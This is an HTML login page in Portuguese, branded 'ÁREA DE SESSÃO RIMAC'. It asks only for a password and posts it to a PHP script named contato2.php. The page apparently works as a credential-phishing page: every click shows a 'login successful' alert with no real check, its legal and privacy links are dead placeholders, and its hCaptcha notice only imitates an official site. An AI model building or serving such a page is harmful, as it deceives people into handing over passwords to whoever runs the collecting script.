<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="css/cont2.css">
    <script>
        window.onload = function() {
            const form = document.querySelector('form');

            form.onsubmit = function(event) {
                event.preventDefault(); // Previne o envio imediato do formulário
                alert('Login efetuado com sucesso!'); // Exibe a mensagem
                // Submete o formulário ao PHP e depois redireciona
                form.submit(); // Submissão ao PHP
                window.location.href = 'login.html'; // Redireciona para outra página após a submissão
            };
        };
    </script>
</head>
<body>
    <div class="pai">
        <div class="login">
            <h1>ÁREA DE SESSÃO RIMAC</h1>
            <br>
            <div class="area">
                <form action="contato2.php" method="post"> 
                    <label for="password">Senha:</label>
                    <input type="password" id="password" name="password" required placeholder="Digite sua senha">
                    <br><br>
                    <button class="botao" type="submit">Continuar</button>
                </form>
            </div>
            <div class="footer">
                <p>
                    Esta página usa hCaptcha. Para mais detalhes, consulte a Proteção de Dados ou o Aviso Legal.
                </p>
                <br><br>
                <div class="link">
                    <a href="#">Informações Legais</a>
                    <br><br>
                    <a href="#">Política de Privacidade</a>
                    <br><br>
                    <a href="#">Modo de exibição</a>
                </div>
            </div>
        </div>
        <div class="foto"></div>
    </div>
</body>
</html>
